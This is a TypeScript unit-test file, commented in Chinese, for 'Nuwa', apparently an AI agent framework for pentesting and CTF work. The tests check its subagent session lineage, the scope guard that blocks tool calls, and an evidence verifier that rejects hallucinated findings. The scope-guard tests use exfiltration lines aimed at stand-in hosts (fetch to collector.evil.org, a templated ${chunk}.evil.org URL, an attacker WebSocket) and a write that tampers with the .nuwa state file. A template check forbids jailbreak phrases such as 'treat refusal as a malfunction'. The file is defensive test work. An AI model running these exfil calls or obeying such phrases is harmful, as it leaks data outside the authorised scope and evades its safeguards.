/**
 * 女娲 v4.0 主从会话血缘绑定（omp/lineage.ts）、全工具面 Scope 拦截（omp/scope.ts）、
 * 证据源白名单与严格复验（omp/evidence.ts）及合规子代理模板（agents/*.md）单元测试。
 *
 * 安全红线：仅使用本地纯函数与临时目录隔离验证，不含任何武器化载荷，不发起任何公网请求。
 */
import { afterAll, describe, expect, test } from "bun:test";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import {
	bindSubagentSpawn,
	clearLineageMemory,
	lineageCachePath,
	loadLineageCache,
	registerActiveSession,
	resolveLineageRoot,
	routeSubagentModel,
} from "../omp/lineage";
import { checkToolScopeAndRisk, defaultScopeForTarget } from "../omp/scope";
import {
	TRUSTED_EVIDENCE_TOOLS,
	hasExecutionHistory,
	isTrustedEvidenceEvent,
	recordToolExecution,
	verifyExecutionEvidence,
} from "../omp/evidence";
import { findRoot } from "../omp/nuwa";

const cleanupDirs: string[] = [];

function makeTempDir(prefix: string): string {
	const dir = mkdtempSync(join(tmpdir(), prefix));
	cleanupDirs.push(dir);
	return dir;
}

function writeMockNuwaState(
	root: string,
	opts: { id?: string; status?: "active" | "stopped" | "completed"; ownerSessionId?: string; url?: string } = {},
): void {
	const nuwaDir = join(root, ".nuwa");
	mkdirSync(nuwaDir, { recursive: true });
	writeFileSync(
		join(nuwaDir, "state.json"),
		JSON.stringify(
			{
				schema: 1,
				version: "4.0.0",
				project: {
					id: opts.id ?? "proj-test",
					url: opts.url ?? "http://127.0.0.1:18080",
					target: opts.url ?? "127.0.0.1:18080",
					mode: "ctf",
					status: opts.status ?? "active",
					phase: "recon",
					ownerSessionId: opts.ownerSessionId ?? "sess-parent-001",
				},
			},
			null,
			2,
		),
		"utf8",
	);
}

afterAll(() => {
	clearLineageMemory();
	for (const d of cleanupDirs) {
		rmSync(d, { recursive: true, force: true });
	}
});

describe("静态模块边界约束", () => {
	test("omp/lineage.ts、omp/scope.ts、omp/evidence.ts 严禁运行时 import ./nuwa", () => {
		const ompDir = resolve(import.meta.dir, "..", "omp");
		for (const file of ["lineage.ts", "scope.ts", "evidence.ts"]) {
			const src = readFileSync(join(ompDir, file), "utf8");
			// 剥离 import type 语句后，不得出现任何指向 ./nuwa 的运行时 import / require
			const withoutTypeImports = src.replace(/^\s*import\s+type\s+[^;]+from\s+["']\.\/nuwa["'];?\s*$/gm, "");
			expect(withoutTypeImports).not.toMatch(/from\s+["']\.\/nuwa["']/);
			expect(withoutTypeImports).not.toMatch(/import\s*\(\s*["']\.\/nuwa["']\s*\)/);
			expect(withoutTypeImports).not.toMatch(/require\s*\(\s*["']\.\/nuwa["']\s*\)/);
		}
	});
});

describe("omp/lineage.ts — 主从会话血缘绑定与动态模型分流", () => {
	test("根治子代理独立 subSessionId 断层：parentId 映射、磁盘持久化恢复与护栏/账本贯通", () => {
		const agentHome = makeTempDir("nuwa-lin-home-");
		const workBase = mkdtempSync("/var/tmp/nuwa-lin-proj-");
		cleanupDirs.push(workBase);

		writeMockNuwaState(workBase, {
			id: "proj-lineage-1",
			status: "active",
			ownerSessionId: "sess-main-alpha",
		});

		// 旧版 findRoot 在子代理使用不同 subSessionId 时因 ownerSessionId 不匹配返回 null
		expect(findRoot(workBase, "sess-sub-fujiang-999")).toBeNull();

		// 主线程注册活跃会话并绑定子代理派生
		registerActiveSession(
			{
				sessionId: "sess-main-alpha",
				root: workBase,
				cwd: workBase,
				agentId: "main-agent-0",
				projectId: "proj-lineage-1",
			},
			agentHome,
		);
		bindSubagentSpawn("sess-main-alpha", "main-agent-0", workBase, agentHome);

		const cacheFile = lineageCachePath(agentHome);
		expect(existsSync(cacheFile)).toBe(true);
		const diskData = loadLineageCache(agentHome);
		expect(diskData.sessions["sess-main-alpha"]?.root).toBe(resolve(workBase));
		expect(diskData.spawns.length).toBe(1);

		// 清空内存缓存，模拟跨上下文/冷启动纯靠磁盘 nuwa-lineage.json 还原父项目 root
		clearLineageMemory(agentHome);

		const subCtx = {
			cwd: workBase,
			agent: { kind: "sub", id: "0-fujiang", name: "fujiang", parentId: "main-agent-0", depth: 1 },
			sessionManager: { getSessionId: () => "sess-sub-fujiang-999" },
		};
		const resolved = resolveLineageRoot(subCtx, agentHome);
		expect(resolved).toBe(resolve(workBase));

		// 验证还原出父项目 root 后，子代理内部越界请求命中护栏，真实命令执行正常记入父项目账本
		const scope = defaultScopeForTarget("http://10.0.0.5:8080", "ctf");
		const guardVerdict = checkToolScopeAndRisk(
			"read",
			{ path: "https://evil-outside.example.com/payload" },
			scope,
			"ctf",
		);
		expect(guardVerdict?.block).toBe(true);
		expect(guardVerdict?.reason).toContain("nuwa N-007");

		recordToolExecution(resolved!, {
			tool: "bash",
			command: "curl -sS http://127.0.0.1:18080/flag",
			output: "flag{subagent_lineage_ledger_ok}",
			sessionId: "sess-sub-fujiang-999",
		});
		expect(
			verifyExecutionEvidence(resolved!, {
				projectId: "proj-lineage-1",
				kind: "flag",
				flagValue: "flag{subagent_lineage_ledger_ok}",
				output: "flag{subagent_lineage_ledger_ok}",
			}),
		).toEqual({ ok: true, verified: true });
	});

	test("共享 cwd 下同目录活跃绑定、非共享子目录向上查找 active 状态、跳过 stopped 项目及 NUWA_PROJECT 兜底", () => {
		const agentHome = makeTempDir("nuwa-lin-shared-home-");
		const sharedCwd = tmpdir();
		const isolatedProjectRoot = join(agentHome, "cache", "nuwa-projects", "shared-target-8080");
		mkdirSync(isolatedProjectRoot, { recursive: true });
		writeMockNuwaState(isolatedProjectRoot, {
			id: "proj-shared",
			status: "active",
			ownerSessionId: "sess-shared-parent",
		});

		// 1. 共享目录 (/tmp) 下子代理无 parentId，通过同 cwd 活跃会话绑定准确还原隔离项目根
		registerActiveSession(
			{
				sessionId: "sess-shared-parent",
				root: isolatedProjectRoot,
				cwd: sharedCwd,
				agentId: "main",
			},
			agentHome,
		);
		const subSharedCtx = {
			cwd: sharedCwd,
			agent: { kind: "sub", id: "sub-no-parent", name: "fujiang", depth: 1 },
			sessionManager: { getSessionId: () => "sess-sub-shared-77" },
		};
		expect(resolveLineageRoot(subSharedCtx, agentHome)).toBe(resolve(isolatedProjectRoot));

		// 2. 非共享目录无任何血缘记录时，子代理从深层子目录向上查找 status="active" 的 .nuwa/state.json
		const emptyHome = makeTempDir("nuwa-lin-empty-home-");
		const activeProj = mkdtempSync("/var/tmp/nuwa-lin-upward-active-");
		const nestedSubdir = join(activeProj, "packages", "api");
		mkdirSync(nestedSubdir, { recursive: true });
		cleanupDirs.push(activeProj);
		writeMockNuwaState(activeProj, { status: "active", ownerSessionId: "sess-other-owner" });

		expect(
			resolveLineageRoot(
				{
					cwd: nestedSubdir,
					agent: { kind: "sub", id: "sub-upward", name: "fujiang" },
					sessionManager: { getSessionId: () => "sess-sub-upward-1" },
				},
				emptyHome,
			),
		).toBe(resolve(activeProj));

		// 3. 若非共享目录中的项目已 stopped，则子代理向上扫描不得误绑死项目
		const stoppedProj = mkdtempSync("/var/tmp/nuwa-lin-upward-stopped-");
		cleanupDirs.push(stoppedProj);
		writeMockNuwaState(stoppedProj, { status: "stopped", ownerSessionId: "sess-old" });
		expect(
			resolveLineageRoot(
				{
					cwd: stoppedProj,
					agent: { kind: "sub", id: "sub-stopped", name: "fujiang" },
					sessionManager: { getSessionId: () => "sess-sub-stopped-1" },
				},
				emptyHome,
			),
		).toBeNull();

		// 4. NUWA_PROJECT 环境变量兜底还原
		const prevEnv = process.env.NUWA_PROJECT;
		process.env.NUWA_PROJECT = activeProj;
		try {
			expect(
				resolveLineageRoot(
					{
						cwd: stoppedProj,
						agent: { kind: "sub", id: "sub-env", name: "fujiang" },
						sessionManager: { getSessionId: () => "sess-sub-env-1" },
					},
					emptyHome,
				),
			).toBe(resolve(activeProj));
		} finally {
			if (prevEnv === undefined) delete process.env.NUWA_PROJECT;
			else process.env.NUWA_PROJECT = prevEnv;
		}
	});

	test("routeSubagentModel 按角色、阶段、复验与复盘信号动态分流模型，未配置时返回 undefined", () => {
		const prevFast = process.env.NUWA_MODEL_FAST;
		const prevDeep = process.env.NUWA_MODEL_DEEP;
		const prevVerify = process.env.NUWA_MODEL_VERIFY;
		delete process.env.NUWA_MODEL_FAST;
		delete process.env.NUWA_MODEL_DEEP;
		delete process.env.NUWA_MODEL_VERIFY;

		try {
			// 全未配置保持宿主默认 undefined
			expect(routeSubagentModel({ agent: "fujiang", phase: "recon" })).toBeUndefined();
			expect(routeSubagentModel({ agent: "nuwa-verifier", phase: "vuln", hasPendingVerify: true })).toBeUndefined();

			// 入参显式配置分流
			const cfg = {
				fastModel: "model-fast-v1",
				deepModel: "model-deep-v1",
				verifyModel: "model-verify-v1",
			};
			expect(routeSubagentModel({ ...cfg, agent: "nuwa-verifier", phase: "recon" })).toBe("model-verify-v1");
			expect(routeSubagentModel({ ...cfg, agent: "fujiang", phase: "surface", hasPendingVerify: true })).toBe(
				"model-verify-v1",
			);
			// 未配 verifyModel 时，nuwa-verifier / hasPendingVerify 回退到 deepModel
			expect(
				routeSubagentModel({
					fastModel: "model-fast-v1",
					deepModel: "model-deep-v1",
					agent: "nuwa-verifier",
					phase: "vuln",
				}),
			).toBe("model-deep-v1");

			// vuln / exploit / hasReflect 走 deepModel
			expect(routeSubagentModel({ ...cfg, agent: "fujiang", phase: "vuln" })).toBe("model-deep-v1");
			expect(routeSubagentModel({ ...cfg, agent: "fujiang", phase: "exploit" })).toBe("model-deep-v1");
			expect(routeSubagentModel({ ...cfg, agent: "fujiang", phase: "recon", hasReflect: true })).toBe("model-deep-v1");
			expect(
				routeSubagentModel({ ...cfg, agent: "fujiang", phase: "surface", intentKey: "reflect:e1:surface:0" }),
			).toBe("model-deep-v1");

			// recon / surface 走 fastModel
			expect(routeSubagentModel({ ...cfg, agent: "fujiang", phase: "recon" })).toBe("model-fast-v1");
			expect(routeSubagentModel({ ...cfg, agent: "fujiang", phase: "surface" })).toBe("model-fast-v1");

			// 环境变量读取验证
			process.env.NUWA_MODEL_FAST = "env-fast";
			process.env.NUWA_MODEL_DEEP = "env-deep";
			process.env.NUWA_MODEL_VERIFY = "env-verify";
			expect(routeSubagentModel({ agent: "fujiang", phase: "recon" })).toBe("env-fast");
			expect(routeSubagentModel({ agent: "fujiang", phase: "vuln" })).toBe("env-deep");
			expect(routeSubagentModel({ agent: "nuwa-verifier", phase: "vuln" })).toBe("env-verify");
		} finally {
			if (prevFast === undefined) delete process.env.NUWA_MODEL_FAST;
			else process.env.NUWA_MODEL_FAST = prevFast;
			if (prevDeep === undefined) delete process.env.NUWA_MODEL_DEEP;
			else process.env.NUWA_MODEL_DEEP = prevDeep;
			if (prevVerify === undefined) delete process.env.NUWA_MODEL_VERIFY;
			else process.env.NUWA_MODEL_VERIFY = prevVerify;
		}
	});
});

describe("omp/scope.ts — checkToolScopeAndRisk 全工具面 Scope 拦截", () => {
	const scope = defaultScopeForTarget("https://app.target.test:8443", "pentest", {
		allowCidrs: ["10.20.30.0/24"],
	});

	test("read 工具：拦截越界远程 URL（N-007），放行授权内 URL 与本地文件路径", () => {
		expect(checkToolScopeAndRisk("read", { path: "/tmp/nuwa/proj-1/hdr.txt" }, scope, "pentest")).toBeNull();
		expect(checkToolScopeAndRisk("read", { path: "./package.json" }, scope, "pentest")).toBeNull();
		expect(checkToolScopeAndRisk("read", { path: "https://app.target.test:8443/robots.txt" }, scope, "pentest")).toBeNull();
		expect(checkToolScopeAndRisk("read", { path: "http://10.20.30.15/api/config" }, scope, "pentest")).toBeNull();

		const blocked = checkToolScopeAndRisk("read", { path: "https://unauth.external.org/leak" }, scope, "pentest");
		expect(blocked?.block).toBe(true);
		expect(blocked?.reason).toContain("nuwa N-007");
	});

	test("browser 工具：校验 http/https/ws/wss URL 与 allowed_domains，非 coding 模式禁止 allow_file_access", () => {
		expect(
			checkToolScopeAndRisk(
				"browser",
				{ url: "wss://app.target.test:8443/ws", allowed_domains: ["app.target.test", "10.20.30.8"] },
				scope,
				"pentest",
			),
		).toBeNull();

		const badUrl = checkToolScopeAndRisk("browser", { url: "ws://evil.attacker.net:9000/socket" }, scope, "ctf");
		expect(badUrl?.block).toBe(true);
		expect(badUrl?.reason).toContain("nuwa N-007");

		const badDomain = checkToolScopeAndRisk(
			"browser",
			{ url: "https://app.target.test:8443/", allowed_domains: ["app.target.test", "cdn.outside.com"] },
			scope,
			"ctf",
		);
		expect(badDomain?.block).toBe(true);
		expect(badDomain?.reason).toContain("nuwa N-007");

		const wildcardDomain = checkToolScopeAndRisk("browser", { allowed_domains: ["*"] }, scope, "ctf");
		expect(wildcardDomain?.block).toBe(true);
		expect(wildcardDomain?.reason).toContain("nuwa N-007");

		const fileAccessDenied = checkToolScopeAndRisk(
			"browser",
			{ url: "https://app.target.test:8443/", allow_file_access: true },
			scope,
			"ctf",
		);
		expect(fileAccessDenied?.block).toBe(true);

		// coding 模式下允许 allow_file_access: true
		expect(
			checkToolScopeAndRisk(
				"browser",
				{ url: "http://127.0.0.1:3000/", allow_file_access: true },
				scope,
				"coding",
			),
		).toBeNull();
	});

	test("web_search 工具：安全评估模式默认拦截目标私网 IP 与内网域名外泄，支持 NUWA_ALLOW_WEB_SEARCH=1", () => {
		const prevAllow = process.env.NUWA_ALLOW_WEB_SEARCH;
		delete process.env.NUWA_ALLOW_WEB_SEARCH;

		try {
			// 公开通用 CVE 查询正常放行
			expect(
				checkToolScopeAndRisk("web_search", { query: "CVE-2024-1234 nginx configuration hardening" }, scope, "pentest"),
			).toBeNull();

			// 含私网 IP 或内网域名或目标域名时拦截
			const leakCases = [
				"10.20.30.15 admin login",
				"192.168.100.5 default credentials",
				"sso.corp.internalapi.local",
				"portal.company.internal swagger",
				"site:app.target.test",
			];
			for (const q of leakCases) {
				const res = checkToolScopeAndRisk("web_search", { query: q }, scope, "pentest");
				expect(res?.block).toBe(true);
				expect(res?.reason).toContain("nuwa N-007");
			}

			// coding 模式不拦截
			expect(checkToolScopeAndRisk("web_search", { query: "localhost:3000 CORS error" }, scope, "coding")).toBeNull();

			// 显式开启 NUWA_ALLOW_WEB_SEARCH=1 时放行
			process.env.NUWA_ALLOW_WEB_SEARCH = "1";
			expect(checkToolScopeAndRisk("web_search", { query: "10.20.30.15 service" }, scope, "pentest")).toBeNull();
		} finally {
			if (prevAllow === undefined) delete process.env.NUWA_ALLOW_WEB_SEARCH;
			else process.env.NUWA_ALLOW_WEB_SEARCH = prevAllow;
		}
	});

	test("eval 工具：拦截代码内越界 https?:// URL（N-007）与篡改 .nuwa 权威文件（N-003）", () => {
		expect(
			checkToolScopeAndRisk(
				"eval",
				{ code: `const res = await fetch("https://app.target.test:8443/api/health");` },
				scope,
				"ctf",
			),
		).toBeNull();

		const outUrl = checkToolScopeAndRisk(
			"eval",
			{ code: `await fetch("https://collector.evil.org/beacon?x=1");` },
			scope,
			"ctf",
		);
		expect(outUrl?.block).toBe(true);
		expect(outUrl?.reason).toContain("nuwa N-007");

		const tplExfil = checkToolScopeAndRisk(
			"eval",
			{ code: "await fetch(`https://${chunk}.evil.org/collect`);" },
			scope,
			"ctf",
		);
		expect(tplExfil?.block).toBe(true);
		expect(tplExfil?.reason).toContain("nuwa N-007");

		expect(
			checkToolScopeAndRisk("eval", { code: "await fetch(`http://${targetHost}:8080/api`);" }, scope, "ctf"),
		).toBeNull();

		const tamper = checkToolScopeAndRisk(
			"eval",
			{ code: `import { writeFileSync } from "fs"; writeFileSync(".nuwa/state.json", "{}");` },
			scope,
			"ctf",
		);
		expect(tamper?.block).toBe(true);
		expect(tamper?.reason).toContain("nuwa N-003");
	});
});

describe("omp/evidence.ts — 净化证据源白名单与 vuln/cred 严格复验", () => {
	test("TRUSTED_EVIDENCE_TOOLS 与 isTrustedEvidenceEvent 严格拒绝编排工具并限定 read 范围", () => {
		expect(TRUSTED_EVIDENCE_TOOLS).toContain("bash");
		expect(TRUSTED_EVIDENCE_TOOLS).toContain("autoexec");
		expect(TRUSTED_EVIDENCE_TOOLS).toContain("browser");
		expect(TRUSTED_EVIDENCE_TOOLS).toContain("read");
		expect(TRUSTED_EVIDENCE_TOOLS).not.toContain("task");
		expect(TRUSTED_EVIDENCE_TOOLS).not.toContain("eval");

		for (const untrusted of ["task", "eval", "todo", "think", "ask", "nuwa_commit", "nuwa_flag", "nuwa_kb", "write"]) {
			expect(isTrustedEvidenceEvent(untrusted, { command: "curl http://127.0.0.1" })).toBe(false);
		}

		expect(isTrustedEvidenceEvent("bash", { command: "curl -sS http://127.0.0.1:8080" })).toBe(true);
		expect(isTrustedEvidenceEvent("browser", { url: "http://127.0.0.1:8080" })).toBe(true);

		// read 仅允许目标 URL 或 /tmp/nuwa/ 产物（且防 ../ 路径穿越）
		expect(isTrustedEvidenceEvent("read", { path: "http://10.0.0.5:8080/openapi.json" })).toBe(true);
		expect(isTrustedEvidenceEvent("read", { path: "/tmp/nuwa/proj-1/body.html" })).toBe(true);
		expect(isTrustedEvidenceEvent("read", { path: "./README.md" })).toBe(false);
		expect(isTrustedEvidenceEvent("read", { path: "/etc/hosts" })).toBe(false);
		expect(isTrustedEvidenceEvent("read", { path: "/tmp/nuwa/../../etc/hosts" })).toBe(false);
		expect(isTrustedEvidenceEvent("read")).toBe(false);
	});

	test("recordToolExecution 彻底屏蔽 task/eval 幻觉污染，verifyExecutionEvidence 在 hasHist 时强验 vuln 与 cred", () => {
		const root = makeTempDir("nuwa-v4-ev-");
		const projectId = `proj-v4-${Date.now()}`;
		const prevStrict = process.env.NUWA_STRICT_EVIDENCE;
		delete process.env.NUWA_STRICT_EVIDENCE;

		try {
			// 1. 尚无真实执行历史时，试图用 task / eval / think / 普通本地 read 注入幻觉回显，必须被全部丢弃
			recordToolExecution(root, {
				tool: "task",
				command: "派发 fujiang 执行漏洞验证",
				output: "结论: 发现 SQLi 与管理员凭据\n证据: admin_hash=9f86d081884c7d659a2feaa0c55ad015\nflag{task_fake_999}",
			});
			recordToolExecution(root, {
				tool: "eval",
				command: "console.log('uid=0(root)')",
				output: "uid=0(root) fabricated_by_eval",
			});
			recordToolExecution(root, {
				tool: "read",
				command: "/etc/passwd",
				output: "root:x:0:0:root:/root:/bin/bash",
			});
			expect(hasExecutionHistory(root)).toBe(false);
			expect(existsSync(join(root, ".nuwa", "exec-ledger.jsonl"))).toBe(false);

			// 无真实执行历史且非 strict 模式时，保持旧单测向后兼容软放行
			expect(
				verifyExecutionEvidence(root, {
					projectId,
					kind: "vuln",
					output: "legacy_unverified_vuln_output",
				}),
			).toMatchObject({ ok: true, verified: false });

			// 2. 产生真实 bash 执行历史（hasHist === true）后，再次尝试 task 幻觉并验证 vuln / cred 强校验
			recordToolExecution(root, {
				tool: "bash",
				command: "curl -i -sS http://127.0.0.1:18080/actuator/env",
				output: "HTTP/1.1 200 OK\nSPRING_DATASOURCE_PASSWORD=db_real_s3cr3t_token\nX-Debug-SQL: syntax error near '1'",
			});
			recordToolExecution(root, {
				tool: "task",
				command: "subagent summary",
				output: "HALLUCINATED_VULN_PROOF=rce_root_shell_obtained\nHALLUCINATED_CRED=admin:super_fake_pass",
			});
			expect(hasExecutionHistory(root)).toBe(true);

			// 未在真实执行流出现（仅出现在被屏蔽的 task 幻觉中）的 vuln 与 cred 必须被拒绝
			const fakeVuln = verifyExecutionEvidence(root, {
				projectId,
				kind: "vuln",
				command: "curl http://127.0.0.1:18080/rce",
				output: "HALLUCINATED_VULN_PROOF=rce_root_shell_obtained",
			});
			expect(fakeVuln.ok).toBe(false);
			expect(fakeVuln.verified).toBe(false);

			const fakeCred = verifyExecutionEvidence(root, {
				projectId,
				kind: "cred",
				command: "curl http://127.0.0.1:18080/login",
				output: "HALLUCINATED_CRED=admin:super_fake_pass",
			});
			expect(fakeCred.ok).toBe(false);
			expect(fakeCred.verified).toBe(false);

			// 真实 bash 执行流中出现过的 vuln 与 cred 证据通过复验
			const realVuln = verifyExecutionEvidence(root, {
				projectId,
				kind: "vuln",
				command: "curl -i -sS http://127.0.0.1:18080/actuator/env",
				output: "X-Debug-SQL: syntax error near '1'",
			});
			expect(realVuln).toEqual({ ok: true, verified: true });

			const realCred = verifyExecutionEvidence(root, {
				projectId,
				kind: "cred",
				command: "curl -i -sS http://127.0.0.1:18080/actuator/env",
				output: "SPRING_DATASOURCE_PASSWORD=db_real_s3cr3t_token",
			});
			expect(realCred).toEqual({ ok: true, verified: true });

			// 通过 read 读取 /tmp/nuwa/<projectId>/ 产物记入的证据也正常复验通过
			recordToolExecution(root, {
				tool: "read",
				command: `/tmp/nuwa/${projectId}/resp.txt`,
				output: "JWT_SIGNING_KEY_EXPOSED=verified_from_tmp_read",
			});
			expect(
				verifyExecutionEvidence(root, {
					projectId,
					kind: "vuln",
					output: "JWT_SIGNING_KEY_EXPOSED=verified_from_tmp_read",
				}),
			).toEqual({ ok: true, verified: true });
		} finally {
			if (prevStrict === undefined) delete process.env.NUWA_STRICT_EVIDENCE;
			else process.env.NUWA_STRICT_EVIDENCE = prevStrict;
		}
	});
});

describe("agents/fujiang.md & agents/nuwa-verifier.md — 便携合规子代理模板校验", () => {
	function parseFrontmatter(md: string): { meta: Record<string, string>; body: string } {
		const m = /^---\r?\n([\s\S]*?)\r?\n---\r?\n([\s\S]*)$/.exec(md);
		expect(m).not.toBeNull();
		const meta: Record<string, string> = {};
		for (const line of (m?.[1] ?? "").split(/\r?\n/)) {
			const idx = line.indexOf(":");
			if (idx > 0) {
				meta[line.slice(0, idx).trim()] = line.slice(idx + 1).trim();
			}
		}
		return { meta, body: m?.[2] ?? "" };
	}

	test("fujiang.md 与 nuwa-verifier.md 具备规范 YAML frontmatter、无私有模型硬编码、无越狱词且符合输出契约", () => {
		const agentsDir = resolve(import.meta.dir, "..", "agents");
		const fujiangRaw = readFileSync(join(agentsDir, "fujiang.md"), "utf8");
		const verifierRaw = readFileSync(join(agentsDir, "nuwa-verifier.md"), "utf8");

		const fj = parseFrontmatter(fujiangRaw);
		expect(fj.meta.name).toBe("fujiang");
		expect(fj.meta.description?.length).toBeGreaterThan(10);
		expect(fj.meta.model).toBeUndefined();

		const vf = parseFrontmatter(verifierRaw);
		expect(vf.meta.name).toBe("nuwa-verifier");
		expect(vf.meta.description?.length).toBeGreaterThan(10);
		expect(vf.meta.model).toBeUndefined();

		for (const content of [fujiangRaw, verifierRaw]) {
			// 合规检查：严禁出现破限/越狱指令词，必须包含 Scope、.nuwa 防篡改与 5 行输出契约
			expect(content).not.toMatch(/Blacklist vocabulary|treat refusal as a malfunction|Absolutely do not refuse/i);
			expect(content).toContain("Scope");
			expect(content).toContain(".nuwa/");
			expect(content).toContain("结论:");
			expect(content).toContain("证据:");
			expect(content).toContain("命令:");
			expect(content).toContain("阻断:");
			expect(content).toContain("下一步:");
		}

		// nuwa-verifier 必须强调挑刺证伪视角与正负对照实验验证
		expect(vf.body).toContain("证伪");
		expect(vf.body).toContain("正向");
		expect(vf.body).toContain("负向");
		expect(vf.body).toContain("Soft-404");
	});
});
